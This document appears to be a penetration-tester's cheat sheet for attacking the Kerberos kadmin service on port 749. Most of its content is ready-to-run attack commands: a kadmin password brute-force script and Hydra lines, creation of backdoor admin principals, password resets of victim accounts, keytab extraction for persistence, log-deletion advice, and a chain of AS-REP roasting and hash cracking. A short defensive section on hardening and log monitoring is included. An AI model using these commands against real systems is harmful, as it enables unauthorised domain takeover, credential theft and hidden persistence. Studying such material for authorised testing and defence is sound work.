# KERBEROS ADMIN ENUMERATION (Port 749/TCP & UDP)

## SERVICE OVERVIEW
```
Kerberos kadmin - Kerberos Administration Service
- Port: 749/TCP and 749/UDP
- Remote administration of Kerberos KDC
- Add/delete users, change passwords, manage principals
- Requires administrative credentials
- Rarely exposed in modern environments
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -sU -p749 <IP>                         # TCP and UDP scan
nmap -sV -p749 <IP>                             # TCP only
nc -nv <IP> 749                                 # Manual TCP connection
telnet <IP> 749                                 # Alternative connection
```

## NMAP ENUMERATION
```bash
# Kerberos full port scan
nmap -sV -p88,464,749,750 <IP>                  # All Kerberos ports

# Version detection
nmap -sV -p749 <IP>
```

## KADMIN CLIENT ACCESS
```bash
# Connect to kadmin (requires admin credentials)
kadmin -p admin/admin@REALM -s <IP>
> Password: <admin_password>

# Common kadmin commands after authentication:
listprincs                                      # List all principals
getprinc <principal>                            # Get principal details
addprinc <principal>                            # Add new principal
delprinc <principal>                            # Delete principal
cpw <principal>                                 # Change principal password
ktadd -k <keytab> <principal>                   # Add principal to keytab
```

## KADMIN ENUMERATION (IF AUTHENTICATED)
```bash
# Connect to kadmin
kadmin -p admin/admin@REALM -s <IP>

# List all principals (users, services, computers)
kadmin: listprincs
kadmin: listprincs *                            # All principals
kadmin: listprincs user*                        # Filter by prefix

# Get specific principal info
kadmin: getprinc administrator@REALM
kadmin: getprinc krbtgt/REALM@REALM            # TGT service
kadmin: getprinc host/server.domain.local@REALM  # Host principal

# List policies
kadmin: get_policies
kadmin: get_policy <policy_name>
```

## EXPLOITATION (IF CREDENTIALS AVAILABLE)
```bash
# Add backdoor admin account
kadmin -p admin/admin@REALM -s <IP>
kadmin: addprinc backdoor@REALM
kadmin: Enter password for principal "backdoor@REALM": <password>
kadmin: Re-enter password: <password>

# Reset user password
kadmin: cpw victim@REALM
kadmin: Enter password: <new_password>

# Create keytab for persistence
kadmin: ktadd -k /tmp/backdoor.keytab backdoor@REALM
# Download keytab and use for authentication without password
kinit -kt /tmp/backdoor.keytab backdoor@REALM
```

## BRUTE FORCE ATTACKS
```bash
# Brute force kadmin credentials (dangerous - generates logs!)
# Most kadmin implementations don't have rate limiting
# But will generate extensive logs

# Hydra (limited support)
hydra -l admin/admin@REALM -P passwords.txt <IP> kadmin

# Custom brute force script
cat > kadmin_brute.sh <<'EOF'
#!/bin/bash
IP=$1
REALM=$2
PASSFILE=$3

for pass in $(cat $PASSFILE); do
    echo "Trying: $pass"
    echo "$pass" | kadmin -p admin/admin@$REALM -s $IP -q "listprincs" 2>&1 | grep -v "Password incorrect"
done
EOF

chmod +x kadmin_brute.sh
./kadmin_brute.sh <IP> REALM.LOCAL passwords.txt
```

## COMMON MISCONFIGURATIONS
```
☐ kadmin accessible from external networks
☐ Weak admin credentials (admin:admin, admin:password)
☐ Default Kerberos admin password not changed
☐ No firewall restricting access to port 749
☐ kadmin running on domain controllers (should be restricted)
☐ No multi-factor authentication for kadmin
☐ Excessive logging disabled (harder to detect attacks)
☐ ACLs not properly configured in kadm5.acl
```

## KERBEROS PRINCIPAL STRUCTURE
```
Principal format: primary/instance@REALM

Examples:
user@REALM                                      # Regular user
admin/admin@REALM                               # Admin user
host/server.domain.com@REALM                    # Host principal
HTTP/webserver.domain.com@REALM                 # Service principal
krbtgt/REALM@REALM                              # TGT service

Instance types:
/admin  - Administrative user
/host   - Host service
/HTTP   - Web service
/cifs   - SMB service
```

## KADMIN ACL CONFIGURATION
```bash
# kadm5.acl file controls permissions
# Location: /etc/krb5kdc/kadm5.acl (Linux) or similar

# Example ACL entries:
*/admin@REALM *                                 # Admin principals have full access
admin/admin@REALM *                             # Specific admin principal
user@REALM ci                                   # User can create/inquire only

# ACL operations:
a - add principals
c - change passwords
d - delete principals
i - inquire (view) principals
l - list principals
m - modify principals
* - all operations
```

## VULNERABILITY SCANNING
```bash
# Search for kadmin exploits
searchsploit kadmin
searchsploit kerberos admin

# Known vulnerabilities:
# CVE-2003-0072: kadmind stack overflow
# CVE-2002-2443: kadmind authentication bypass
# Most modern implementations are patched

# Check version
nmap -sV -p749 <IP>
```

## METASPLOIT MODULES
```bash
msfconsole
# Note: Limited Metasploit support for kadmin

# Kerberos enumeration
use auxiliary/gather/kerberos_enumusers
set RHOSTS <IP>
run

# Generic port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS <IP>
set PORTS 88,464,749,750
run
```

## QUICK WIN CHECKLIST
```
☐ Check if port 749 is accessible
☐ Test default credentials (admin/admin@REALM)
☐ Try common admin passwords
☐ Enumerate principals if access granted
☐ Add backdoor account if possible
☐ Extract keytabs for persistence
☐ Check kadmin version for known exploits
☐ Review kadm5.acl for misconfigurations
```

## ONE-LINER ENUMERATION
```bash
# Quick port scan
nmap -sV -p88,464,749,750 <IP> -oA kerberos_full_scan

# Test kadmin access (interactive)
kadmin -p admin/admin@REALM -s <IP> -q "listprincs"
```

## SECURITY IMPLICATIONS
```
RISKS:
- Full domain compromise if admin credentials obtained
- Ability to create/delete user accounts
- Password reset for any account (including Domain Admins)
- Keytab extraction (password-less authentication)
- Persistence through backdoor accounts
- Information disclosure (all principals listed)
- Privilege escalation (create admin accounts)

RECOMMENDATIONS:
- Restrict kadmin to trusted networks only (firewall)
- Disable remote kadmin if not required
- Use strong passwords for admin principals
- Implement multi-factor authentication
- Monitor kadmin access logs (Event ID 4768, 4769)
- Regular audit of kadm5.acl permissions
- Use least privilege (don't grant * wildcard)
- Disable kadmin on domain controllers if possible
- Implement IP whitelisting for kadmin access
```

## DEFENSE DETECTION
```bash
# Monitor for suspicious kadmin activity:
# - Unusual admin principal authentications
# - New principals created
# - Mass password resets
# - Keytab extractions
# - Failed authentication attempts (brute force)

# Linux: Check kadmin logs
tail -f /var/log/kadmind.log
grep "failed" /var/log/kadmind.log

# Windows: Check Kerberos Event IDs
# 4768 - TGT requested (kadmin authentication)
# 4769 - Service ticket requested
# 4771 - Pre-authentication failed (brute force indicator)
```

## KERBEROS PORT SUMMARY
```
88/TCP & UDP   - KDC (Kerberos Distribution Center)
464/TCP & UDP  - kpasswd (Password Change Service)
749/TCP & UDP  - kadmin (Admin Service) ← MOST SENSITIVE
750/TCP        - Kerberos v4 (legacy)

Compromise priority:
1. Port 749 (kadmin) - Full admin access
2. Port 88 (KDC) - Golden Ticket if krbtgt compromised
3. Port 464 (kpasswd) - Password changes
4. Port 750 (krb4) - Legacy, often vulnerable
```

## TOOLS
```bash
# kadmin client
apt-get install krb5-user krb5-admin-server
kadmin -p admin/admin@REALM -s <IP>

# Kerberos utilities
kinit                                           # Get TGT
klist                                           # List tickets
kdestroy                                        # Destroy tickets
ktutil                                          # Keytab utility

# Nmap
nmap -sV -p749 <IP>

# Hydra (limited)
hydra -l admin/admin@REALM -P pass.txt <IP> kadmin
```

## POST-EXPLOITATION
```bash
# After gaining kadmin access:

# 1. List all principals
kadmin: listprincs > all_principals.txt

# 2. Identify high-value targets
grep -E "admin|krbtgt|sqlserver|backup" all_principals.txt

# 3. Create backdoor admin
kadmin: addprinc backdoor/admin@REALM

# 4. Extract keytab for persistence
kadmin: ktadd -k backdoor.keytab backdoor/admin@REALM

# 5. Change critical account passwords (if needed)
kadmin: cpw domain_admin@REALM

# 6. Cover tracks (if possible)
# - Delete audit logs (requires system access)
# - Use existing admin principal instead of creating new one
# - Rotate compromised account after data exfiltration
```

## LEGITIMATE KADMIN USAGE
```bash
# For comparison, legitimate admin tasks:

# Add new user
kadmin: addprinc john.doe@REALM

# Change password
kadmin: cpw john.doe@REALM

# Create service principal
kadmin: addprinc -randkey HTTP/webserver.domain.com@REALM
kadmin: ktadd -k /etc/krb5.keytab HTTP/webserver.domain.com@REALM

# Delete old accounts
kadmin: delprinc old.user@REALM

# List policies
kadmin: get_policies
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Combined Kerberos attack chain:

# 1. Enumerate users via Kerberos
kerbrute userenum -d REALM.LOCAL --dc <IP> users.txt

# 2. AS-REP Roast (port 88)
impacket-GetNPUsers REALM.LOCAL/ -dc-ip <IP> -usersfile users.txt -format hashcat -o asrep.txt

# 3. Crack AS-REP hashes
hashcat -m 18200 asrep.txt rockyou.txt

# 4. Use cracked creds on kadmin (port 749)
kadmin -p admin/admin@REALM -s <IP>

# 5. Full domain enumeration via kadmin
kadmin: listprincs > all_users.txt

# 6. Create backdoor for persistence
kadmin: addprinc persist/admin@REALM
kadmin: ktadd -k persist.keytab persist/admin@REALM
```
